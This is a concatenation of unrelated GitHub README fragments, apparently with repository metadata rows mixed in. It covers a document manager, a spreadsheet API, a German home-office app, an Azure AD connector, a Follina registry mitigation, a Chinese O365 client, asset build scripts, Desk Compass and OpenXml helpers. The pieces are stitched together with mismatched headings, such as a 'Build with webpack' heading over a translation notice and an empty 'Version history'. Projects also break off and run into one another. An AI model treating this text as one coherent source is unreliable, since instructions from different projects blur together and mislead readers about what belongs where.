        - /path/paperless-office-documents/data/processed:/srv/data/processed
        - /path/paperless-office-documents/raw:/srv/data/raw
      restart: always
  ```
* Run `docker-compose up -d` to start paperless-office.
* Configured with the snippet above, the Web UI will be available via browser on http://localhost:8000/.


# Similar Projects
There are two other projects named [Paperless](https://github.com/the-paperless-project/paperless) and [Mayan EDMS](https://www.mayan-edms.com/) out there, that have technical overlap with paperless-office. In contrast to paperless-office, both are written in Python and do have a broader feature set (like document encryption). In favor, paperless-office brings a prettier UI, Git integration and a Webviewer allowing access to your documents via GitLab or GitHub pages.

# Git integration

A simple Git integration can be extended by supplying a CI workflow to deploy the contents via GitLab Pages or GitHub Pages.

## GitLab CI

`gitlab-ci.yaml` example configuration:
```yaml
pages:
  image: alpine:3.13
  script:
    - mkdir public
    - cp -rf * public/ || true
  artifacts:
    paths:
      - public
```

Each operation in paperless-office Web UI leads to a push to your Git repository. The CI pipeline will be triggered on each push, therefore re-deploying GitLab pages. The webviewer is then available via https://username.gitlab.io/paperless-office-documents

## Spreadsheet

### creating a new document

```js
var doc = OfficeDocument.create({ type: ""spreadsheet"" });
// or
var doc = OfficeDocument.create(""spreadsheet"");

// get the active and only sheet of the document
var sheet = doc.activeSheet;
```

### importing an existing document
currently not supported

### working with sheets
a spreadsheet can have multiple sheets
``` js
// get the current and active sheet
var sheet = doc.activeSheet;

// create sheet
var sheet = doc.addSheet(""first"");

// get sheet by index
var sheet = doc.getSheet(1);
// get sheet by name 
var sheet = doc.getSheet(""first"");

// set title
sheet.title = ""first"";
```

### working with cells
single cell
```js
// get cell
var cell = sheet.getCell(""A1"")
var cell = sheet.getCell({ col: ""A"", row: 1 })
var cell = sheet.getCell({ col: 1, row: 1 })

// set value
cell.value = ""test"";
cell.value = 2000;
cell.value = new Date();

// change style
cell.style.bold = true;
cell.style.italic = true;
cell.style.underline = ""solid"";
cell.style.underlineColor = ""#ff0000"";
cell.style.color = ""reb(255,0,0)"";
cell.style.backgroundColor = ""red"";
cell.style.columnWidth = 20;
cell.style.rowHeight = 10;

// at once
sheet.setCell(""A1"", {
  value: ""test"",
  style: {
    bold: true,
    underline: ""dash""
  }
})
```
multiple cells
```js
// get cells content
var content = sheet.getCells(""A1:B3"").map(c => c.value)

// set cells
sheet.setCells(""A1:B3"", { style: { backgroundColor: ""#ff0000"" } })
```

### specials
```js
sheet.freezeAt(""A1"")
sheet.autoFilter(""A1"", ""K9"")
```

### export
there a several export formats:

#### OpenDocument spreadsheet
```js
var data = await doc.export(""ods"", {
    compressionLevel: 9
  });
fs.writeFileSync(path.join(__dirname, ""test.ods""), Buffer.from(data))
```

#### Comma-separated values
only one sheet of the SpreadsheetDocument can be exported
```js
var data = await doc.export(""csv"", {
    separator: "";"",
    useQuotes: true,
    sheet: ""name or index of the sheet""
});
fs.writeFileSync(path.join(__dirname, ""test.csv""), data)
```


## Build with webpack

Translations in languages other than English are machine translated and are not yet accurate. No errors have been fixed yet as of March 21st 2021. Please report translation errors [here](https://github.com/<developerName>/<repoName>/issues/). Make sure to backup your correction with sources and guide me, as I don't know languages other than English well (I plan on getting a translator eventually) please cite [wiktionary](https://en.wiktionary.org) and other sources in your report. Failing to do so will result in a rejection of the correction being published.

Note: due to limitations with GitHub's interpretation of markdown (and pretty much every other web-based interpretation of markdown) clicking these links will redirect you to a separate file on a separate page that isn't the intended page. You will be redirected to the [.github folder](/.github/) of this project, where the README translations are hosted.

Translations are currently done with Bing translate and DeepL. Support for Google Translate translations is coming to a close due to privacy concerns.

## Version history

## Software status

All of my works are free some restrictions. DRM (**D**igital **R**estrictions **M**anagement) is not present in any of my works.

![DRM-free_label.en.svg](/DRM-free_label.en.svg)

This sticker is supported by the Free Software Foundation. I never intend to include DRM in my works.

I am using the abbreviation ""Digital Restrictions Management"" instead of the more known ""Digital Rights Management"" as the common way of addressing it is false, there are no rights with DRM. The spelling ""Digital Restrictions Management"" is more accurate, and is supported by [Richard M. Stallman (RMS)](https://en.wikipedia.org/wiki/Richard_Stallman) and the [Free Software Foundation (FSF)](https://en.wikipedia.org/wiki/Free_Software_Foundation)

This section is used to raise awareness for the problems with DRM, and also to protest it. DRM is defective by design and is a major threat to all computer users and software freedom.

## General info
This project is part of Data Scientist with Python [datacomp](https://app.datacamp.com/learn/career-tracks/data-scientist-with-python?version=5).
	
##  Description
In this project, you’ll apply the skills you learned in Introduction to Python and Intermediate Python to solve a real-world data science problem. You’ll press “watch next episode” to discover if Netflix’s movies are getting shorter over time and which guest stars appear in the most popular episode of ""The Office"", using everything from lists and loops to pandas and matplotlib.

## Inspiration ✨
Bring the Office to your Home! Wir vernetzen & inspirieren alle Menschen, die im Home Office arbeiten (müssen). Unser Ziel ist es, euren Arbeitsalltag zu verbessern, euch zu motivieren und so die Produktivität aufrecht zu erhalten. Mit unserer App kreiert ihr euch zuhause euren Happy Space und übersteht die Corona Krise mit Leichtigkeit & Spaß! 

## What it does ⛑
Unser Tool hilft Dir, den Home-Office-Alltag in den Griff zu bekommen. Es bietet Inspiration und Begleitung, den ganzen Tag über. Die Vernetzung und der Erhalt des Gemeinschaftsgefühls ist gerafe in der Isolation in der Corona-Krise besonders wichtig. HomeMe gibt außerdem Tipps zur Pausengestaltung und bedient verschiedene Vorlieben und Charaktere.

## How we built it 🔨
HomeMe wurde mit <3 und viel Teamwork von einem interdisziplinären Team in Deutschland entwickelt. Unsere Technologien basierend momentan weitgehendst auf Typescript und Vue.js. Momentan haben wir noch kein Backend und lesen unsere Daten aus Airtable. In der Zukunft planen wir ein Backend oder eine Datenbankanbindung zu implementieren, um so unsere Webanwendung noch besser zu machen. 

## Challenges we ran into 🏃‍♂️
Das Festlegen von erreichbaren und guten Zielen ist eine allgegenwärtige Herausforderung. Ein großes Projekt in 48 Stunden mit einem Team von 11 Personen abzuwickeln, benötigt ein großes Maß an Koordination und parallelem Arbeiten. Dieses Problem konnte jedoch durch regelmäßige Absprachen und klar definierten, mit jedem abgestimmten, Ziele gelöst werden. 
Um eine Anwendung zu Entwickeln, die für jeden Nutzer eine individuelle Erfahrung verspricht, musste ein Algorithmus entwickelt werden, der mit Hilfe von Anwenderdaten das Pausenprogramm individuel zuschneidet.
Ein Tool, das Nutzer durch den Tag begleiten soll, muss gut aussehen! In der Anfangsphase des Projektes gab es keinen Designer im Team, der diese Anforderung an das Tool erfüllen konnte, sodass eine Expansion des Teams im Verlauf des Projekts unausweichlich wurde.


## Accomplishments that we're proud of 💪
Wir sind stolz ein Tool zu entwickeln, dass auch nach der Corona Krise einen gesellschaftlichen Mehrwert bringen wird. HomeMe verbessert die Produktivität und Gesundheit von allen Menschen -- im Home Office, aber auch am Arbeitsplatz! Großartiges Teamwork und die Offenheit zu lernen sind nur eines unserer Erfolgsgeheimnisse! :) 

## What we learned 👩‍🎓
Für eine hohe Produktivität sind Pausen unbedingt notwendig und nichts, wofür man sich schämen muss. Home-Office bedeutet auf keinen Fall Isolation, denn der soziale Aspekt der Arbeit muss nicht zwangsläufig verloren gehen. Die 4 wichtigsten Säulen einer effektiven Pause sind die Dauer, soziale Aktivität, körperliche Aktivität und geistige Aktivität. Insbesondere kurze Pausen von einer Dauer von 1 bis 5 Minuten sind besonders förderlich.

## What's next for HomeMe | Personalisierter HomeOffice Begleiter
Wir wollen euer Feedback um HomeMe noch besser machen! Benutz unsere App, schmeißt fette Avatar-Home-Office-Parties und vernetzt euch mit euren Kollegen. Mit Hilfe von künstlicher Intelligenz machen wir unsere App für euch noch smarter. In der Zukunft wollen wir euch so eine noch bessere User Experience bieten, mit individuellen Pausen Plänen und noch benutzerfreundlicherem Design.

## Introduction
The interface to communicate with Microsoft Azure AD is through the Microsoft Graph API. GetConnectors are based on a pre-defined 'data collection', which is an existing view based on the data inside the Profit database.

For this connector we have the option to correlate to existing Azure AD users and provision (dynamic) groupmemberships.
  >__Currently only Microsoft 365 and Security groups are supported by the [Microsoft Graph API](https://docs.microsoft.com/en-us/graph/api/resources/groups-overview?view=graph-rest-1.0).<br>
This means we cannot manage Mail-enabled security groups and Distribution groups, These can only be managed using the [Exchange Online connector](https://github.com/Tools4everBV/HelloID-Conn-Prov-Target-ExchangeOnline).__

If you want to create Azure accounts, please use the built-in Microsoft Azure Active Directory target system.

<!-- GETTING STARTED -->
## Getting the Azure AD graph API access

By using this connector you will have the ability to manage Azure AD Guest accounts.

### Application Registration
The first step to connect to Graph API and make requests, is to register a new <b>Azure Active Directory Application</b>. The application is used to connect to the API and to manage permissions.

* Navigate to <b>App Registrations</b> in Azure, and select “New Registration” (<b>Azure Portal > Azure Active Directory > App Registration > New Application Registration</b>).
* Next, give the application a name. In this example we are using “<b>HelloID PowerShell</b>” as application name.
* Specify who can use this application (<b>Accounts in this organizational directory only</b>).
* Specify the Redirect URI. You can enter any url as a redirect URI value. In this example we used http://localhost because it doesn't have to resolve.
* Click the “<b>Register</b>” button to finally create your new application.

Some key items regarding the application are the Application ID (which is the Client ID), the Directory ID (which is the Tenant ID) and Client Secret.

### Configuring App Permissions
The [Microsoft Graph documentation](https://docs.microsoft.com/en-us/graph) provides details on which permission are required for each permission type.

To assign your application the right permissions, navigate to <b>Azure Portal > Azure Active Directory >App Registrations</b>.
Select the application we created before, and select “<b>API Permissions</b>” or “<b>View API Permissions</b>”.
To assign a new permission to your application, click the “<b>Add a permission</b>” button.
From the “<b>Request API Permissions</b>” screen click “<b>Microsoft Graph</b>”.
For this connector the following permissions are used as <b>Application permissions</b>:
*	Read and Write all user’s full profiles by using <b><i>User.ReadWrite.All</i></b>
*	Read and Write all groups in an organization’s directory by using <b><i>Group.ReadWrite.All</i></b>
*	Read and Write data to an organization’s directory by using <b><i>Directory.ReadWrite.All</i></b>

Some high-privilege permissions can be set to admin-restricted and require an administrators consent to be granted.

To grant admin consent to our application press the “<b>Grant admin consent for TENANT</b>” button.

### Authentication and Authorization
There are multiple ways to authenticate to the Graph API with each has its own pros and cons, in this example we are using the Authorization Code grant type.

*	First we need to get the <b>Client ID</b>, go to the <b>Azure Portal > Azure Active Directory > App Registrations</b>.
*	Select your application and copy the Application (client) ID value.
*	After we have the Client ID we also have to create a <b>Client Secret</b>.
*	From the Azure Portal, go to <b>Azure Active Directory > App Registrations</b>.
*	Select the application we have created before, and select ""<b>Certificates and Secrets</b>"". 
*	Under “Client Secrets” click on the “<b>New Client Secret</b>” button to create a new secret.
*	Provide a logical name for your secret in the Description field, and select the expiration date for your secret.
*	It's IMPORTANT to copy the newly generated client secret, because you cannot see the value anymore after you close the page.
*	At last we need to get the <b>Tenant ID</b>. This can be found in the Azure Portal by going to <b>Azure Active Directory > Overview</b>.

### Connection settings
The following settings are required to connect to the API.

| Setting     | Description |
| ------------ | ----------- |
| Azure AD Tenant ID | Id of the Azure tenant |
| Azure AD App ID | Id of the Azure app |
| Azure AD App Secret | Secret of the Azure app |

paulgrammer,ppt-to-json,,https://github.com/paulgrammer/ppt-to-json,https://api.github.com/repos/ppt-to-json/paulgrammer,Convert power point presentations to json,"# PPT to JSON

This library provides a simple and convenient way to convert PowerPoint (.ppt) files into JSON format. This allows for easy parsing, manipulation, and analysis of slide content.

## Installation

To install the `ppt-to-json` library, use npm:

```bash
npm install ppt-to-json
```

## Usage

First, import the `PPTtoJSON` from `ppt-to-json`.

```javascript
const PPTtoJSON = require(""ppt-to-json"");
```

Then, call the `readPath` function with the path to your PowerPoint file.

```javascript
PPTtoJSON.readPath(""./sample.ppt"")
  .then((json) => console.log(json))
  .catch((error) => console.error(error.message));
```

This function will return a Promise that resolves to a JSON object representing the content of the PowerPoint file. If an error occurs while reading the file or converting it to JSON, the Promise will be rejected with an error message.

## Resulting JSON structure

The resulting JSON object has a structure that represents the content of the PowerPoint file. Each slide in the file is converted into an object in the JSON array. Each object includes the content of the slide, formatted as a string, along with any additional metadata about the slide.

```json
[
  {
    ""slideNumber"": 1,
    ""title"": ""Slide 1"",
    ""content"": ""This is the content of slide 1.""
  },
  {
    ""slideNumber"": 2,
    ""title"": ""Slide 2"",
    ""content"": ""This is the content of slide 2.""
  },
  // More slides...
]
```

## Error Handling

If an error occurs while reading the PowerPoint file or converting it to JSON, the Promise will be rejected with an Error. You can handle this using the `.catch()` method:

```javascript
PPTtoJSON.readPath(""./non_existent.ppt"")
  .then((json) => console.log(json))
  .catch((error) => console.error(error.message)); // Will print: Error: File not found: ./non_existent.ppt
```

MalwareForwarder is an Outlook VSTO add-in that makes it easy for users to forward messages to a predefined address with just a single click.

![MalwareForwarder Ribbon image](/Documentation/images/MFRibbon.PNG)

The add-in adds two buttons to the Outlook Ribbon, one to forward Malware, one to forward Spam. You can set a separate forwarding address for each button, or disable either button. By default, the add-in will delete the original message and it will not save a copy of the sent email in the Sent Items folder. You can change either of these settings.

# What to see some samples ?

We are sure that you will like to see what the VBUC can do for you.

* You can take a look at our [Reference Sample Application called Salmon King Seafood (SKS)](https://github.com/MobilizeNet/SKS). This is a fictions company that sells seafood. We provide the VB6 code as well as the migrated code to C#, to .NET Core and to ASP.NET Core.

* We also prepared with Microsoft an extended sample for their [Tailwind Azure Demos](https://azureappsdemomap.com/tailwind) this demo is a Point of Sale Application that is [migrated from VB6 to Desktop and then to Azure](https://github.com/microsoft/TailwindTraders-PointOfSale).  

# VBUC transforms desktop apps to .NET and web

Unlike a rewrite, VBUC moves existing back-end logic to the new platform, keeping proven and debugged logic and processes intact and dramatically reducing the total defects to be resolved following the migration.

There are several drivers for a VB to .NET migration:

Integrate Windows, Web, Office and Mobile solutions
Boost system performance
Ease deployment
Improve the maintenance of an application
Increase developer productivity
Consolidate your company's valuable software assets
Avoid **obsolescence of outdated software** [support for VB 6 ended on April 8th, 2008 ](https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-basic-6/visual-basic-6-support-policy?redirectedfrom=MSDN).

## Upgraded Stubs
When a library a library has some classes, properties, methods or events that aren't already supported an Upgrade Stub will be generated.
An Upgrade Stub is a ""mock"" class. 

``` C#
public class MSXML2_XMLHTTP30
{

### About the library

This library was written for the use of the ADS1256 through Arduino and Excel, with the aim of maximizing user control in real time.
It was also based on the works of Flydroid, dariosalvi78, chepo92 and adienakhmad.

The communication library between Arduino and Excel was written by  [Roberto Valgolio](http://www.robertovalgolio.com/sistemi-programmi/arduino-excel), downloadable from his website, and is already present as an attachment without any modification. The Excel sheet has been modified by me with the addition of further functions for the control of the ADS1256. By modifying the Arduino code it is possible to control other digital modules, such as other ADCs (tested), digital potentiometers (tested), stepper motors (tested), DACs, optical or motion sensors.

### rExcel

rExcel is a communication protocol for Arduino that transforms a normal Excel worksheet into a serial monitor in turn divided by the number of cells in the sheet, which all operate independently of each other. Through it it is possible to collect data in real time from Arduino, or to send multiple commands, execute sections of code or pause Arduino void loop().
The executable file contains the drivers for the library, the code examples for Arduino and a basic rExcel sheet with integrated VBA functions, as well as all the instructions on its functions and its use.

#### Excel commands

- write(worksheet, range, value) : writes and updates value to the designated cell;
- writeIndexed(worksheet, row, column, value) : writes sequence of values in the designated column;
- get(worksheet, range, value) : follows the value in the designated cell.

Using the get (...) function together with an ""if"" loop, you can activate specific sections of the code or pause them by setting a value in the target cell.

Examples:

-  run only if there is a value of 1 in the target cell

```cpp
myExcel.get(""worksheet"", ""range"", value);
	int example = atoi(value);
	if (example == 1) {
		code1();
	}
```

- run only once when there is a value of 1 in the target cell

```cpp
myExcel.get(""worksheet"", ""range"", value);
	int example2 = atoi(value);
	if (example2 == 1) {
		code2();
		myExcel.clear(""worksheet"", ""range"");
	}
```

*in this case the arguments of get() and clear() must be the same.

#### Preview

![ADS1256_rExcel.xlms](https://i.ibb.co/6sGcG4p/Screenshot-11.png ""ADS1256_rExcel.xlms"")


#### Functionality

+ **Connect** - Open the connection for the COM port and default baund rate. They must be customized by opening Visual Basic from Excel (ALT + F11), VBAProject (ADS1256 rExcel.xlsm), Microsoft Excel objects, Sheet 1 (rExcel), Private Sub CommandButton10_Click().
+ **Restart** - Restart the connection. It should be customized as ""Connect"" in Private Sub CommandButton6_Click()
+ **Send** - Send the new settings to Arduino. It must be called at each change of SPS, PGA, Sample Time, R and Q.
+ **FormConnect** - Opens the COM port selection window, baund rate and connection start.
+ **Show/hide** - Show or hide the chart. I have integrated this function by default in the connection and restart button, as the real-time graph can enormously slow down the connection and cause delays. It can be disabled by going to Visual Basic from Excel (ALT + F11), VBAProject (ADS1256 rExcel.xlsm), Form, FormConnect, Public Sub ShowInfo().
+ **Close** - Save and close quickly without any confirmation notice.
+ **Clear** - Clear the range A2:E10000
+ **ΔY graph** - Select the increment to add to the Y axis of the graph. By default the graph chooses Y max. and Y min. from column B. For positive values there is a negative zoom effect, for negative values a positive zoom effect.
+ **X min.** - Select the minimum value for the X axis. If idx> 500, the graph will automatically set the value of X min. obtaining a pleasant sliding effect.


### Kalman filter

This library implements a simple Kalman filter. It can be called with the .filter function (R, Q, input), returning in filtered value.
The filter is regulated by the R and Q parameters. For a practical use the filtering quality is regulated by the R / Q ratio.

Patch for the Follina zero day exploit currently effecting MS Office. This patch works on Windows 10, I have not tested it on previous versions of Windows.
The exploit this is patching DOES effect earlier versions of Windows (Both Desktop and Server) so be careful. 

## Patch Notes/Instructions

##### (CVE-2022-30190 - disable the Preview pane)
##### First, make sure to disable the Preview pane in Windows
It is strongly advised to disable the Preview pane in Windows Explorer to remove this attack vector, to do so, follow these instructions: 

1) Open File Explorer.
2) Click on View Tab.
3) Click on Preview Pane to view\hide it.

##### (CVE-2022-30190 - msdt child process)
Make sure to kill the child process if it is currently runnning on your computer. 
This can be done via Task Manager (CTRL+SHIFT+ESC) -> Services (Tab) and Stop the msdt service from running

##### (CVE-2022-30190 - disable msdt)
##### Second, unregister msdt (script included as well as manual instructions)

https://github.com/hereticerik/follina-patch/blob/main/unregister-msdt.reg
 
unregister-msdt.reg - Unregister ms-msdt to protect against recent office 0day exploit ""Follina"".

If you'd like to do this manually without running this registry fix:
1) Run Command Prompt as Administrator.
2) To back up the registry key, execute the command ""reg export HKEY_CLASSES_ROOT\ms-msdt ms-msdt.reg""
3) Execute the command ""reg delete HKEY_CLASSES_ROOT\ms-msdt /f""

Reboot after this patch and you should be good to go for Windows 10

在为本项目做出贡献前，请仔细阅读 python-o365 项目的文档，及全部代码 [传送门](https://github.com/O365/python-o365)

此项目(O365-Client)为原 OMM(O365-Mail-Manager)项目

用 Python 编写的代码示例，与 O365 连接并查阅邮件，查看日历等。我们的梦想是尽可能多的集成 API。

~~欢迎大家前往[Microsoft Graph 项目](https://github.com/Fuider/MSGraph-Client)！~~

# 联系

如果您遇到问题，或是有任何建议，欢迎联系我们：邮件：[pengbo@pengbo0708.onmicrosoft.com](mailto:pengbo@pengbo0708.onmicrosoft.com), Telegram 用户群：[点击这里](https://t.me/fuider)。

# 注意

Bug 已解决，但相关方法尚未集成。

# 公告

1. 我们改变了开发方向，决定不再只针对于 O365 用户服务，而是所有微软用户，这意味着后续 Planner,Azure Direction 等 API 不会加入。原因一是因为我们的时间不够，而是因为我们现在一位使用者都没有。

2. 由于此分支更改了 API,所需的权限,也就是日历的权限。所以需要重新验证授权。如果报错，可以先尝试删除目录底下的 o365_token.txt.

3. 我们是一群热爱计算机的学生，非微软官方。😂

**欢迎 Pull requests 和 Issues!**

这是我第一个独立的项目，希望大家支持。
~~自 2020.7.23 起，此项目将不再定期维护，但如果以后有时间，我将会继续做下去。~~
感谢 csdn 和电报中众多朋友的帮助，现在我决定继续维护这个项目。
程序很简单，通过我的应用 ID 和机密连接到你的账号，并操作，运用了一个模板 [O365](https://github.com/O365/python-o365 ""O365"").
如果你要使用，请：

# 用法

1. pip install O365
2. 准备一个微软账号 [注册](https://account.microsoft.com/account?lang=zh-cn) ，事实上我更推荐含 Office 365(现更名为 Microsoft 365)的 E5 开发者订阅（我用的就是这个比较靠谱，而且可以支持所有的 API），注册方法请自行百度。
3. 运行Client.py

## 关于 office 365 账户

有一位朋友跟我讲说他需要获取 office E5 订阅
那么我就在这里讲一下大致的步骤。

1. 访问微软的开发者网站 https://developer.microsoft.com/zh-cn/office

2. 按下""立即加入""，或""了解更多信息""，接下来你需要登录你注册的免费的微软账号。
   ![图片](https://share.pengbo.workers.dev/1595596248544.jpg)

3. 我们是一群热爱python的学生，非Microsoft官方。😂

4.然后你添加完之后就能拿到一个有 25 位用户许可证的 E5 订阅，包含了全套的 office 套件，可用来正版激活软件，就不用熊那些么盗版的激活工具了，只要登录你的账号就可以激活办公软件了，不止支持软件的激活，这个订阅还包括了每个用户都有 5 TB 的云存储空间，还有你可以给他们分配邮箱。我的做法是给我的朋友们分配了这些邮箱，然后我便可以与他们联系。
[Office 网页版](https://office.com)
[管理员网站](https://admin.microsoft.com)
如果想要正常使用所有功能，需要在管理员网站中为你的主账户，就是默认生成的那个账户，也就是管理员账户分配一个许可证(E5)
此时你所有的邮箱后缀都为.onmicrosoft.com 如果你想要自定义后缀的话，可以绑定自定义域名，当然这些都是后话了，请自行百度。

需要注意的是，这个订阅是会过期的！如果 90 天内不进行开发活动(其实也有自动续订的方法)，微软就会删除你的订阅，这里推荐一个自动续订的方法
https://blog.curlc.com/archives/687.html
如果你觉得我讲的不够详细。那么你可以看一看这篇文章。
https://blog.curlc.com/archives/599.html
提醒:onedrive 默认的存储容量为 1 TB，需要将他们手动改为 5 TB，当然，1TB=1024 GB，相当于百度网盘的容量。你如果直连下载 onedrive 的文件的话，速度可能只比百度云快一点点，虽然微软没有对其进行限速，因为 onedrive 的服务器在国外，你可以搭建 oneindex(如果你使用的是自己的应用 ID 和机密，还可以提高续订的概率，因为据说微软时看 API 的调用量判断你的开发是否活跃。使用本程序也可以调用 API，虽然调用的是我的[偷笑]但是你可以换成你的，具体怎么换？我过一段时间回写下来。) 或其他的索引，或者一些在线的工具获取下载直链，然后通过 idm 多线程下载速度很快。
具体如何更改 onedrive 的容量，请看这篇文章。

## 优点

1. 简洁，体积小
2. 后台自动刷新 token，无需烦恼
3. 基本符合类编程风格，开发人员看的时候省心
4. 使用公共客户端流，更安全！

## 使用场景

1. 大陆 O365 用户
   由于 GFW 的封锁，访问 O365 网页版服务时，加载 js，脚本，页面等会用很长时间，使用本程序就简化了这些，提高效率。
2. 轻度用户
   不经常看邮箱，日历，只偶尔看一下，不想要下载微软那么大的软件。
3. 即用即退的用户
   本程序登录简单，注销也简单。将...token.txt 删去即可。
4. 极客，发烧友
   在终端命令行操作，范儿立马就有了！
5. Python 爱好者，学者，小白
   并不是很难，可以做代码示例学习。

This is a batch script that will download and compile all UK IPO frontend styles, ready for use in your project.

It includes:
- <a href=""https://github.com/alphagov/govuk_elements"">GOV.UK elements</a>.
- <a href=""https://github.com/alphagov/govuk_frontend_toolkit"">GOV.UK Frontend Toolkit</a>.
- <a href=""https://github.com/alphagov/govuk_template"">GOV.UK Template</a>.
- <a href=""https://github.com/intellectual-property-office/Assets"">UK Intellectual Property Office Assets</a>.

All SASS will be output as CSS. 

Local IPO assets will be combined with existing GOV.UK styles. 

## Requirments

### To install assets
* <a href=""https://nodejs.org/en/"">Node.js</a> version 3.X+
* The script will bring down any remaining dependencies. 

### To develop assets
* The <a href=""https://rubyinstaller.org/"">Ruby</a> language.
* A local installation of <a href=""http://sass-lang.com/"">SASS</a>.

## Installation 

#### 1. Download or clone this repo.
#### 2. Launch the batch script.

## Usage

There are two usage modes available.

### Install assets

This script will compile a production ready frontend asset set. You will have the option to select from the following outputs:

* <b>User mode:</b> This will remove any files not needed for the frontend to function. It will also minify CSS and JS output files. Source map files will be included. You will be able to select a current 'stable' and previous 'legacy' release of assets. This mode is recommended for the majority of users.

* <b>Developer mode:</b> This will keep all files used in the installation including associated node packages. In addition to 'stable' and 'legacy' modes, you will be able to select an 'experimental' release option. This will provide you with the absolute latest version of each module. You will be given the option to minify JS and CSS files. This mode is recommended for debug purposes or users who want to test new styles that are currently under review by the UX Team. 

### Edit assets

This script will set up a developer environment, that will allow you to make changes or additions to IPO assets.

This requires a local installation of <a href=""http://sass-lang.com/"">SASS</a>.

You will have the option to select from the following outputs:

* <b>Sass User:</b> This will close the script after setting up the development environment.

* <b>Sass Developer:</b> This will start the SASS 'watch' command ready for development.

Run the following command from the root before continuing development in the future.

```sh
$ sass --watch scss:css
```

## About Desk Compass

Example screenshot:

![Screenshot](docs/screenshot.png)


### Features

- Display different types of markers, like people, tables, first aid kits a.s.o
- Filter markers via search filter
- Toggle visibility of markers and their labels by type
- Move and rotate markers
- Edit marker properties and upload an image
- `health` and `metrics` endpoints available


## Getting started

### Build for development

You'll need Node.js >= 18.x and Yarn:

- Run `yarn install` to install all necessary dependencies
- Start server and frontend simultaneously with `yarn start`
- See application UI http://localhost:3000/
- See API at http://localhost:3030/api/swagger and as OpenAPI JSON at http://localhost:3030/api/swagger-json
- See health indicator at http://localhost:3030/health
- See application metrics at http://localhost:3033/metrics


### Build for production

- Create a production environment `cp environments/.env.development environments/.env` and adjust it accordingly
- Run `yarn install --frozen-lockfile --ingnore-scripts`
- Run `yarn build`
- You'll need to copy a few files to your `<TARGET_DIRECTORY`
  - `mkdir <TARGET_DIRECTORY>/static` 
  - `cp -r node_modules/ <TARGET_DIRECTORY>/`
  - `cp -r workspaces/api/dist/* <TARGET_DIRECTORY>/`
  - `cp -r workspaces/api/frontend/* <TARGET_DIRECTORY>/static/`
- Then in your target directory `node main`


### With Docker

```shell
$ docker build -t desk-compass .
$ MSYS_NO_PATHCONV=1 docker run --rm --name=desk-compass \
  -e DATABASE_PATH=/storage/db \
  -e IMAGE_STORAGE_PATH=/storage/images \
  -v ""/.tmp/deskcompass:/storage:rw"" \
  -p 5000:3030 desk-compass
```
Open http://localhost:5000/ in your browser

**Environment variables:**

The following environment variables are **required** to start the application:

- `IMAGE_STORAGE_PATH` (must): Path to folder to store uploaded images. Read and write permissions for the application are required.
- `DATABASE_PATH` (must): Path to folder to persist application data. Read and write permissions for the application are required.

The following environment variables are **optional**:

- `NODE_ENV`: Should be set to `development` for local development. It is empty by default. If set to `development`, it will
  - structure and colorize JSON log output
  - enable Swagger UI for API endpoints (at http://localhost:3030/swagger)
- `API_PORT`: adjust port to backend API, fallback is `3030`
- `DATABASE_HUMAN_READABLE`: application data is stored in a JSON file. Set this to `true` for readability.
- `CORS_ALLOWED_ORIGINS`: comma-separated list of allowed origins (will be parsed as Regex). If not set, CORS will be disabled. Eg.: `CORS_ALLOWED_ORIGINS=""localhost:3000$,127.0.0.1:3000$""`.
- `CORS_ALLOWED_METHODS`: comma-separated list of allowed methods. If not set, it will fall back to `""GET,HEAD,OPTIONS,PUT,POST,DELETE""`
- `METRICS_PORT`: Port for metrics endpoint, defaults to `3033`. This would expose `http://localhost:3033/metrics` for local development.


## Developer guide

Install all necessary dependencies, create basic environment setup for local development and then start application in watch mode:

```shell
yarn install
cp workspaces/api/local.env workspaces/api/.env
yarn start
```
- See application UI http://localhost:3000/
- See API at http://localhost:3030/swagger and as OpenAPI JSON at http://localhost:3030/swagger-json
- See health indicator at http://localhost:3030/health
- See application metrics at http://localhost:3033/metrics


### Run unit tests

Run frontend and API tests
```shell
yarn run test
```
Run API tests only
```shell
yarn workspace api run test
```

Run frontend tests only
```shell
yarn workspace frontend run test
```

For all calls a `yarn run test:watch` variant exists.


### Run e2e tests

Install browsers with `npx playwright install`

Run e2e tests:
```shell
yarn run e2e
```

Run e2e tests in watch mode, which opens vitest UI:
```shell
yarn run e2e:watch
```

To run application and e2e tests independently, start the application first with
```shell
yarn start
```
and then in another console:
```shell
yarn workspace e2e run test:watch
```


### Run linters

Run frontend and API linters
```shell
yarn run lint
```

AlexandruIstrate,Chronicy,,https://github.com/AlexandruIstrate/Chronicy,https://api.github.com/repos/Chronicy/AlexandruIstrate,Automatic productivity solution,"# Chronicy

Chronicy is the new standard in task management. With the help of Chronicy you can track your progress in supported situations automatically. This means there is no need for manually recording your progress when working or playing. Chronicy does it automatically for you, removing the annoyance of classic productivity applications, that required you to spend more time recording how productive you were instead of actually working.

![Main Image](./Images/Main.png)

## How Does it Work?
Chronicy features a three-component model, in order to most efficiently track your activity. The three core parts of Chronicy are:
- A background service that listens for changes and raises events
- Extensions that allow third party application to register their progress in the Chronicy system
- A GUI application that allows you to communicate with the Chronicy system. This is what gives a normal user the possibility to log custom data and configure the application

Chronicy features both local storage and cloud storage. This way, you can store your data locally or share it between your devices. The data is stored securely in a structured database for both the local app and the cloud service.

## Features
- Tracking your actions in supported applications via extensions
- Automatic insertion of daily activities into your application
- Modern, fluid user interface
- Safe storage of your data inside a database
- Low memory footprint
- Efficient, bother-free operation

## User Interface
Chronicy features a simple interface that gives you a clear overview of what you are working on.

A set of extension methods for `DocumentFormat.OpenXml` which simplifies creating and modifying Word documents (such as .docx).
You can use these methods with your existing `DocumentFormat.OpenXml` code without having to change anything.

# Getting Started
Example document creation with 1 formatted paragraph:
```cs
string fileName = ""TEST.docx"";

using (var document = WordprocessingDocument.Create(fileName, WordprocessingDocumentType.Document))
{
	Body body = document.CreateBody()
	  .PageWidth(21, MeasuringUnits.Centimeters) // A4 width
	  .PageHeight(29.7, MeasuringUnits.Centimeters); // A4 height

	body.AppendChild(new Paragraph(
		new Run().Text(""This is a single, centered paragraph."")
		  .FontSize(16)
		  .FontColor(""Red"") // #FF0000 will also work
		  .FontFace(""Times New Roman""))
		.Justification(JustificationValues.Center));

	document.Save();
}
```

# Highlighted Features
- Super quick and easy Builder-like pattern:
```cs
var run = new Run().Text(""This is a simple Run."")
  .FontSize(24)
  .FontColor(""Red"")
  .Bold()
  .Italic();
```
---
- The ability to create Paragraphs with multiple Runs and multiple formattings:
```cs
Run[] runs = new[]
{
	new Run().Text(""This is a"").FontSize(16),
	new Run().Text("" single paragraph "").FontFace(""Comic Sans MS""),
	new Run().Text(""with 3 Runs."").HighlightColor(HighlightColorValues.Cyan)
};
